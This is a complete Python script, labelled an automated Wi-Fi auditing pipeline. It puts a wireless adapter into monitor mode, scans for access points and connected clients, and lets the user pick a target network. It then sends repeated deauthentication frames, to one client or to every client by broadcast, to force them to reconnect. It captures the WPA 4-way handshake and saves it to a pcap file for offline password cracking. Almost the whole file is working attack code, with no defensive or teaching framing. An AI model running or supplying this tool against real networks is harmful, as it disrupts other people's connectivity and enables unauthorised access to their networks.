#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import curses
from threading import Thread, Event
from scapy.all import (
    RadioTap,
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11Deauth,
    EAPOL,
    sniff,
    sendp,
    wrpcap
)

OUTPUT_CAP = "automated_handshake.cap"

# Global data structures
networks = {}  # bssid: {'ssid': ..., 'channel': ..., 'rssi': ...}
clients = {}   # bssid: set(client_macs)
stop_hopper = Event()
handshake_captured = False
captured_packets = []


# --- STEP 1: ADAPTER SELECTION & MONITOR MODE ---

def get_wireless_interfaces():
    """Returns a list of available wireless interfaces."""
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)
        interfaces = []
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("Interface"):
                interfaces.append(line.split()[1])
        return interfaces
    except Exception as e:
        print(f"[-] Error getting interfaces: {e}")
        sys.exit(1)


def enable_monitor_mode(iface):
    """Kills conflicting processes and puts the interface in monitor mode."""
    print(f"[*] Stopping conflicting processes...")
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"[*] Enabling monitor mode on {iface}...")
    subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Check if interface name changed to wlanXmon
    mon_iface = iface if "mon" in iface else f"{iface}mon"
    
    # Verify monitor mode
    res = subprocess.run(["iw", "dev", mon_iface, "info"], capture_output=True, text=True)
    if "type monitor" in res.stdout:
        print(f"[+] Monitor mode active on: {mon_iface}")
        return mon_iface
    else:
        # Fallback manual method
        subprocess.run(["ip", "link", "set", iface, "down"])
        subprocess.run(["iw", iface, "set", "type", "monitor"])
        subprocess.run(["ip", "link", "set", iface, "up"])
        print(f"[+] Monitor mode manually forced on: {iface}")
        return iface


# --- STEP 2: SCANNING & CHANNEL HOPPING ---

def channel_hopper(iface):
    """Continuously hops through 2.4GHz channels (1-13)."""
    channel = 1
    while not stop_hopper.is_set():
        try:
            subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        channel = (channel % 13) + 1
        time.sleep(0.3)


def scan_pkt_handler(pkt):
    """Parses Beacons and Data frames to track APs and connected clients."""
    if not pkt.haslayer(Dot11):
        return

    # Extract AP information
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            if not ssid:
                ssid = "<Hidden SSID>"
        except Exception:
            ssid = "<Unknown>"

        rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
        
        elt = pkt.getlayer(Dot11Elt)
        channel = 1
        while elt:
            if elt.ID == 3:  # DS Parameter Set
                channel = ord(elt.info)
                break
            elt = elt.payload.getlayer(Dot11Elt)

        networks[bssid] = {'ssid': ssid, 'channel': channel, 'rssi': rssi}
        if bssid not in clients:
            clients[bssid] = set()

    # Track Client MACs
    addr1 = pkt[Dot11].addr1
    addr2 = pkt[Dot11].addr2
    for bssid in list(networks.keys()):
        if addr1 == bssid and addr2 and addr2 != bssid and addr2 != "ff:ff:ff:ff:ff:ff":
            clients[bssid].add(addr2)
        elif addr2 == bssid and addr1 and addr1 != bssid and addr1 != "ff:ff:ff:ff:ff:ff":
            clients[bssid].add(addr1)


# --- STEP 3: TERMINAL SCANNING UI ---

def terminal_scanner_ui(stdscr):
    """Displays real-time AP information. Returns when 's' is pressed."""
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(500)

    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, "=== REAL-TIME WI-FI SCANNER ===", curses.A_BOLD)
        stdscr.addstr(1, 0, f"{'#':<4} {'BSSID':<18} {'CH':<4} {'RSSI':<6} {'CLIENTS':<8} {'SSID'}")
        stdscr.addstr(2, 0, "-" * 65)

        ap_list = list(networks.items())
        
        if not ap_list:
            stdscr.addstr(4, 2, "Scanning channels... Listening for beacons...")
        else:
            for idx, (bssid, data) in enumerate(ap_list):
                client_count = len(clients.get(bssid, []))
                line = f"{idx+1:<4} {bssid:<18} {data['channel']:<4} {data['rssi']:<6} {client_count:<8} {data['ssid']}"
                stdscr.addstr(3 + idx, 0, line[:79])

        # Bottom Prompt
        footer_y = max(len(ap_list) + 5, 10)
        stdscr.addstr(footer_y, 0, "=" * 65)
        stdscr.addstr(footer_y + 1, 0, "Press 's' when ready to select an AP and start attack.", curses.A_STANDOUT)
        stdscr.refresh()

        key = stdscr.getch()
        if key == ord('s') or key == ord('S'):
            return ap_list


# --- STEP 4: DEAUTH & CAPTURE PIPELINE ---

def capture_handler(pkt, target_bssid):
    global handshake_captured, captured_packets
    captured_packets.append(pkt)

    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        addr1 = str(pkt[Dot11].addr1).lower()
        addr2 = str(pkt[Dot11].addr2).lower()
        if target_bssid.lower() in [addr1, addr2]:
            print(f"\n[!] SUCCESS: EAPOL Handshake captured for {target_bssid}!")
            handshake_captured = True


def run_deauth_capture(iface, bssid, client_mac):
    global handshake_captured
    
    pkt = (
        RadioTap() /
        Dot11(type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=7)
    )

    print(f"[*] Starting targeted sniffer on BSSID {bssid}...")
    sniffer_thread = Thread(
        target=lambda: sniff(
            iface=iface,
            prn=lambda p: capture_handler(p, bssid),
            stop_filter=lambda x: handshake_captured,
            timeout=120
        ),
        daemon=True
    )
    sniffer_thread.start()
    time.sleep(1)

    attempts = 0
    while not handshake_captured and attempts < 10:
        attempts += 1
        print(f"[*] Attempt {attempts}/10: Transmitting deauth burst to {client_mac}...")
        sendp(pkt, iface=iface, count=5, inter=0.05, verbose=False)
        
        # Wait for handshake
        time.sleep(6)

    if handshake_captured:
        wrpcap(OUTPUT_CAP, captured_packets)
        print(f"\n[+] SUCCESS! WPA 4-Way Handshake saved to '{OUTPUT_CAP}'")
    else:
        print("\n[-] Timed out without capturing a full handshake.")


# --- MAIN EXECUTION ---

def main():
    if os.geteuid() != 0:
        sys.exit("[-] Script must be run as root (sudo).")

    # 1. Ask user for Interface
    interfaces = get_wireless_interfaces()
    if not interfaces:
        sys.exit("[-] No wireless interfaces found.")

    print("==================================================")
    print("       AUTOMATED WI-FI AUDITING PIPELINE          ")
    print("==================================================")
    print("Available Wireless Adapters:")
    for idx, iface in enumerate(interfaces):
        print(f" [{idx + 1}] {iface}")

    choice = input("\nSelect interface number: ").strip()
    try:
        selected_iface = interfaces[int(choice) - 1]
    except (IndexError, ValueError):
        sys.exit("[-] Invalid selection.")

    # 2. Put selected adapter into Monitor Mode
    mon_iface = enable_monitor_mode(selected_iface)

    # 3. Start channel hopping & scanning threads
    print(f"[*] Starting scanner on {mon_iface}...")
    hopper_thread = Thread(target=channel_hopper, args=(mon_iface,), daemon=True)
    hopper_thread.start()

    scanner_thread = Thread(
        target=lambda: sniff(iface=mon_iface, prn=scan_pkt_handler, store=False),
        daemon=True
    )
    scanner_thread.start()

    # 4. Open UI (Wait until 's' is pressed)
    time.sleep(1)
    ap_list = curses.wrapper(terminal_scanner_ui)

    # Stop channel hopper
    stop_hopper.set()

    if not ap_list:
        sys.exit("[-] No APs discovered during scan.")

    # 5. Let user select target AP number from terminal
    print("\n" + "="*50)
    for idx, (bssid, data) in enumerate(ap_list):
        print(f" [{idx + 1}] BSSID: {bssid} | CH: {data['channel']:<2} | SSID: {data['ssid']}")
    print("="*50)

    ap_choice = input("\nEnter the target AP number: ").strip()
    try:
        target_bssid, ap_data = ap_list[int(ap_choice) - 1]
    except (IndexError, ValueError):
        sys.exit("[-] Invalid AP selection.")

    target_channel = ap_data['channel']
    print(f"\n[+] Locked Target: {ap_data['ssid']} ({target_bssid}) on Channel {target_channel}")

    # 6. Lock Interface to AP's channel
    subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(target_channel)],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 7. Select Target Client MAC
    available_clients = list(clients.get(target_bssid, []))
    if available_clients:
        target_client = available_clients[0]
        print(f"[+] Targeted connected client MAC: {target_client}")
    else:
        target_client = "ff:ff:ff:ff:ff:ff"
        print("[!] No clients found in scan for this AP. Using Broadcast MAC (FF:FF:FF:FF:FF:FF).")

    # 8. Run Deauth & Handshake Capture
    run_deauth_capture(mon_iface, target_bssid, target_client)


if __name__ == "__main__":
    main()
    
